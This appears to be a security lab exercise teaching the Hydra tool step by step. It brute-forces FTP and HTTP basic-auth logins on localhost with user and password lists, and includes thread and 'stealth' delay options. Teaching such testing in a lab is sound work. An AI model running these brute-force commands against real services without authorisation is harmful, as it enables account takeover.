Task 2: Brute-Force Attacks with Hydra
Step 1: Understand Hydra Syntax
Learn basic Hydra command structure:

# Display help
hydra -h

# Basic syntax patterns:
# hydra -l username -p password target service
# hydra -L userlist -P passlist target service
# hydra -L userlist -P passlist -t threads -f target service
Step 2: Single Credential Testing
Test individual credentials:

# Test single username and password
hydra -l testuser1 -p password123 127.0.0.1 ftp

# Test single username with password list
hydra -l admin -P passlist.txt 127.0.0.1 ftp -v
Step 3: Full Brute-Force Attack
Execute comprehensive attacks:

# FTP brute-force with verbose output
hydra -L userlist.txt -P passlist.txt -v -f -o ftp_results.txt 127.0.0.1 ftp

# HTTP basic auth brute-force
hydra -L userlist.txt -P passlist.txt -f -o http_results.txt 127.0.0.1 http-get /protected/

# View results
cat ftp_results.txt
cat http_results.txt
Step 4: Advanced Hydra Options
Explore performance and stealth options:

# Use multiple threads (faster)
hydra -L userlist.txt -P passlist.txt -t 16 127.0.0.1 ftp

# Add delays between attempts (stealth)
hydra -L userlist.txt -P passlist.txt -W 2 127.0.0.1 ftp

# Stop after first success
hydra -L userlist.txt -P passlist.txt -f 127.0.0.1 ftp
